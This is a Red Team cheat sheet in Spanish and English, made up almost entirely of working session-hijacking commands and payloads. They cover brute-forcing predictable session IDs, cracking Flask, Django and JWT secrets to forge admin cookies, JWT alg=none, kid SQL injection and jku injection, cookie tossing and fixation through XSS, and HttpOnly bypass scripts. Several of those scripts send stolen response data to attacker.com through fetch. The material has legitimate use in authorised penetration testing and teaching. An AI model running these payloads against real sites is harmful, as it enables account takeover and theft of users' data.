---
aliases:
  - Cookie Forging
  - Cookie Tossing
  - HttpOnly Bypass
  - Predictable Session ID
tags:
  - vuln/session-hijacking
  - technique/credential-access
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[Session Hijacking]]"
  - "[[JWT Attacks]]"
---
# Session Hijacking - Cookie Tampering y Forging

---

## Predictable Session IDs

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `for i in {1..20}; do curl -sI -X POST -d "user=test$i&pass=test" https://target/login \| grep -oE 'session=[^;]+' ; done > sessions.txt` | Collect 20 sessions for pattern analysis | Pre-attack capture. |
| `cat sessions.txt \| sort -u \| wc -l` | Unique count — low = sequential | Token entropy probe. |
| `cat sessions.txt \| awk '{print length($0)}' \| sort -u` | Token length consistency | Format check. |
| `python3 -c "import base64; print(base64.b64decode('SESSION_VALUE'))"` | Try base64 decode token | Reversible encoding. |
| `python3 -c "import struct,time; print(struct.unpack('<I', bytes.fromhex('SESSION_HEX'))[0])"` | Decode integer/timestamp embedded | Timestamp-based. |
| `for i in {1000..2000}; do curl -i -b "session=$i" https://target/dashboard \| grep -q "Welcome" && echo "HIT $i"; done` | Sequential brute integer IDs | Direct prediction. |
| `python3 -c "import uuid; print(uuid.uuid1())"` (captured + 1ms increment) | UUIDv1 timestamp+MAC predict | UUIDv1 weakness. |
| `python3 -c "import hashlib,time; print(hashlib.md5(f'admin{int(time.time())}'.encode()).hexdigest())"` | MD5(user+timestamp) predict | Weak hash gen. |
| `burp-suite` → Sequencer → Live Capture token endpoint → analyze entropy | Statistical entropy analysis | Burp built-in. |
| `python3 stardust.py SESSION_HEX` (Mersenne Twister recovery) | Recover Math.random state from sample | Math.random PRNG. |
| `cat sessions.txt \| hexdump -C \| head -20` | Visual byte pattern detect | Pattern detect. |
| `python3 -c "import random; random.seed(1234567890); print(random.randint(1000000,9999999))"` (test seed hypothesis) | Verify time-based PRNG seed | PRNG seed reverse. |
| `hashcat -m 0 -a 3 sessions.hex '?l?l?l?l?l?l?l?l'` | Mask attack short tokens | Token <8 bytes. |
| `git clone https://github.com/PortSwigger/sequencer-cli && sequencer-cli -i sessions.txt -m fips` | FIPS randomness test on captured tokens | Crypto weakness. |
| `python3 -c "from itertools import product; [print(''.join(p)) for p in product('abcdef0-9', repeat=6)]"` (range brute) | Generate prediction space | Narrow space. |
^sh-tamper-predictable

### Workflow predictable session ID

```bash
# 1. Capture multiple sessions
for i in {1..50}; do
  curl -sI -X POST -d "user=test$i&pass=test" https://target/login \
    | grep -oE 'session=[^;]+' >> sessions.txt
done

# 2. Entropy analysis (Shannon)
python3 <<EOF
import math
from collections import Counter
data = open('sessions.txt').read()
counts = Counter(data)
total = len(data)
entropy = -sum((c/total) * math.log2(c/total) for c in counts.values())
print(f"Shannon entropy: {entropy:.3f} bits/char")
EOF

# 3. Visual pattern
hexdump -C sessions.txt | head -20

# 4. Try sequential brute
for i in {1000..5000}; do
  curl -s -o /dev/null -w "%{http_code} $i\n" \
    -b "session=$i" https://target/dashboard | grep -E '^200'
done
```

---

## Weak HMAC / Signed Cookies

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 flask-unsign --decode --cookie '<COOKIE>'` | Decode Flask session cookie struct | Flask app pre-attack. |
| `python3 flask-unsign --unsign --cookie '<COOKIE>' --wordlist rockyou.txt` | Brute Flask SECRET_KEY | Flask weak secret. |
| `python3 flask-unsign --sign --cookie "{'user':'admin'}" --secret 'CRACKED'` | Forge admin cookie post-crack | Forge after crack. |
| `cookiemonster -c '<COOKIE>' -w rockyou.txt` | Universal signed cookie crack (Flask/Express/Django/Rails) | Multi-framework. |
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt` | JWT HS256 secret crack | JWT cookie. |
| `python3 jwt_tool.py "$JWT" -C -d rockyou.txt` | jwt_tool dict attack | JWT. |
| `python3 ruby-unmarshal.py "$RAILS_COOKIE"` | Decode Rails serialized session | Rails app. |
| `python3 django_secret_keygen.py --hash $DJANGO_COOKIE --wordlist secrets.txt` | Django SECRET_KEY brute | Django app. |
| `python3 -c "from itsdangerous import URLSafeTimedSerializer; s=URLSafeTimedSerializer('CRACKED'); print(s.dumps({'user':'admin'}))"` | Forge itsdangerous-signed | Flask/Pyramid. |
| `git clone https://github.com/Rhynorater/CVE-2023-24329` (Python url parse leak) | Source disclosure → secret read | Source leak combo. |
| `curl https://target/.git/config && wget -r https://target/.git/` | Git leak combo to find SECRET_KEY | OSINT. |
| `python3 length-extension.py --hash MD5 --signature SIG --known-data 'user=guest' --append '&admin=true'` | Length extension attack legacy hash | MD5(secret+data) sin HMAC. |
| `python3 padding-oracle.py --url https://target/login --cookie 'enc=AAAA'` | Padding oracle decrypt encrypted cookie | CBC encrypted cookie. |
| `hashcat -m 16500 -a 3 jwt.txt '?a?a?a?a?a?a?a?a'` | Mask attack short JWT secret | Sin wordlist. |
| `python3 -c "import hmac,hashlib; print(hmac.new(b'CRACKED', b'user=admin', hashlib.sha256).hexdigest())"` | Manual HMAC forge post-crack | DIY. |
^sh-tamper-weak-hmac

---

## JWT Manipulation

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 jwt_tool.py "$JWT" -X a` | alg=none direct forge | Lazy validator. |
| `python3 jwt_tool.py "$JWT" -X k -pk pubkey.pem` | RS256→HS256 algorithm confusion | Pubkey-as-HMAC. |
| `python3 jwt_tool.py "$JWT" -C -d rockyou.txt` | HS256 secret dict crack | Weak secret. |
| `hashcat -a 0 -m 16500 jwt.txt rockyou.txt` | GPU HS256 crack | Volume. |
| `python3 jwt_tool.py "$JWT" -X i -I -pc name -pv admin` | Inject `name=admin` claim | Claim manipulation. |
| `python3 jwt_tool.py "$JWT" -I -hc kid -hv '../../../dev/null' -S hs256 -p ''` | kid path traversal — known file as key | kid file-backed. |
| `python3 jwt_tool.py "$JWT" -I -hc kid -hv "1' UNION SELECT 'secret'-- -" -S hs256 -p 'secret'` | kid SQLi force secret value | kid DB-backed. |
| `python3 jwt_tool.py "$JWT" -X s -ju https://attacker.com/.well-known/jwks.json` | jku injection — attacker hosts JWKS | jku trust no validation. |
| `python3 jwt_tool.py "$JWT" -X s -jw attacker_pub.pem` | jwk embedded in header | jwk trust no validation. |
| `python3 -c "import jwt; print(jwt.decode('$JWT', options={'verify_signature':False}))"` | Decode JWT no verify | Pre-attack inspect. |
| `curl -H "Authorization: Bearer $FORGED" https://target/api/admin` | Use forged JWT | Direct exploit. |
^sh-tamper-jwt

---

## Cookie Tossing (Sub Overrides Parent)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>document.cookie='session=ATTACKER; Domain=.target.com; Path=/'</script>` (vía XSS en sub.target.com) | Set parent-scope cookie from sub-XSS | Sub-XSS combo. |
| `curl -H "Cookie: csrf=ATTACKER_TOKEN; Domain=.target.com" https://app.target.com/` (vía sub takeover) | Cookie tossing via subdomain takeover | Sub takeover combo. |
| `<script>document.cookie='session=ATTACKER; Domain=.target.com; Path=/admin'</script>` | Path-specific cookie inject | Targeted admin path. |
| `<script>document.cookie='session=KNOWN_SID; Domain=.target.com'</script>` (pre-auth fixation) | Force session fixation pre-login | Fixation combo. |
| `<script>for(let i=0;i<100;i++)document.cookie='session=A'.repeat(i)+'; Domain=.target.com'</script>` | Cookie jar overflow — drop legit cookie | Cookie limit exploit. |
| `<script>document.cookie='__Secure-session=ATTACKER; Domain=.target.com; Secure'</script>` (test if `__Secure-` enforced) | `__Secure-` prefix bypass probe | Defense check. |
| `<script>document.cookie='session=ATTACKER; Domain=target.com; Path=/'</script>` (sin leading dot RFC 6265) | RFC 6265 leading-dot variant | RFC variant. |
| `<script>document.cookie='session=; Max-Age=0; Domain=.target.com; Path=/'</script>` (delete victim cookie first) | Drop existing cookie | Pre-fixation. |
| `<script>document.cookie='session=ATTACKER; Domain=.target.com; SameSite=None; Secure'</script>` | Cross-site iframe inject | Modern SameSite. |
| `python3 -c "import requests; r=requests.get('https://sub.target.com/xss?p=<script>document.cookie=\"session=X;Domain=.target.com\"</script>')"` | Reflected XSS sub → cookie set | Reflected combo. |
| `curl -X POST -H "Host: app.target.com" -H "Cookie: session=A; session=B" https://target/` | Multiple cookies same name — browser order ambiguity | Parser confusion. |
^sh-tamper-tossing

---

## HttpOnly Bypass Tricks

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `<script>fetch('/api/profile', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>` | XSS reads response — cookies sent by browser | HttpOnly indirect bypass. |
| `<script>var x=new XMLHttpRequest(); x.open('GET','/api/me'); x.withCredentials=true; x.onload=()=>fetch('//attacker.com/?d='+btoa(x.responseText)); x.send()</script>` | XHR con credentials — read response data | Same indirect. |
| `<script>navigator.serviceWorker.register('/sw.js').then(r=>{...})</script>` (SW intercepts Set-Cookie responses) | Service Worker intercepts Set-Cookie | Modern bypass. |
| `<script>fetch('/auth/refresh',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('//attacker.com/?t='+d.token))</script>` | Force refresh — token returned in body | Refresh endpoint leak. |
| `curl -X TRACE -H "Cookie: session=ABC" https://target/` (XST historic) | TRACE method reflects Cookie header in body | Pre-2010 servers. |
| `<script>fetch('/error?x=<script>',{credentials:'include'}).then(r=>r.text()).then(d=>d.includes('session')&&fetch('//attacker.com/?d='+btoa(d)))</script>` | Header reflection en error response | Error verbose leak. |
| `<script>const ws=new WebSocket('wss://target/ws'); ws.onopen=()=>ws.send('{}')</script>` (cookies attached by browser to WS handshake) | WebSocket handshake leaks cookie via CSWSH | CSWSH combo. |
| `python3 -c "import requests; print(requests.get('https://target/api/me', cookies={'session':'CAPTURED'}).text)"` (post network sniff) | Use stolen cookie out-of-band | Sniff capture. |
| Burp Repeater con `Cookie: session=ABC` luego View → Decoder | Manual HttpOnly read post-MITM | Manual. |
| `<iframe src="https://target.com/profile" id=v></iframe><script>setTimeout(()=>fetch('//attacker.com/?d='+btoa(v.contentDocument.body.innerHTML)),3000)</script>` | Same-origin iframe DOM read | SOP-bound iframe. |
| `<script>fetch('https://target.com/api/me', {credentials:'include', mode:'cors'}).then(r=>r.json()).then(d=>fetch('//attacker.com/?d='+btoa(JSON.stringify(d))))</script>` | Cross-origin con CORS allow-credentials | CORS combo. |
| `<a href="https://target.com/redirect?to=//attacker.com">click</a>` (cookie leaked via Referer) | Cookie leak via Referer redirect | Referer leak. |
^sh-tamper-httponly-bypass

---
